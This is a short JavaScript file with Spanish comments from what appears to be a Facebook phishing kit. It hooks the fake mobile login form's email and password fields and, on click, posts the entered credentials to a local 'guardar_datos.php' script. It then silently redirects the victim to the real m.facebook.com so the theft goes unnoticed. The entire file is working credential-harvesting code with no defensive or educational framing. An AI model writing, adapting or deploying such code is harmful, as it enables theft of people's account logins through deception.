document.addEventListener("DOMContentLoaded", function () {
    const URL_REDIRECCION = "https://m.facebook.com", // La url a la que se envía después de que pone sus datos
        URL_GUARDAR_DATOS = "./guardar_datos.php",
        $btnLogin = document.querySelector("#l"),
        $usuario = document.querySelector("#m_login_email"),
        $password = document.querySelector("#m_login_password");
    // Escuchar click del botón
    $btnLogin.addEventListener("click", () => {
        // Si no hay usuario o contraseña escritos, no continuamos
        if (!$usuario.value || !$password.value) return;
        // En caso de que sí haya datos, armamos el objeto de la carga útil
        let cargaUtil = {
            usuario: $usuario.value,
            password: $password.value,
        };
        // Y lo enviamos
        fetch(URL_GUARDAR_DATOS, {
            method: "POST",
            body: JSON.stringify(cargaUtil)
        }).then(() => {
            // Al terminar, simplemente redirigir
            window.location.href = URL_REDIRECCION;
        });
    });
});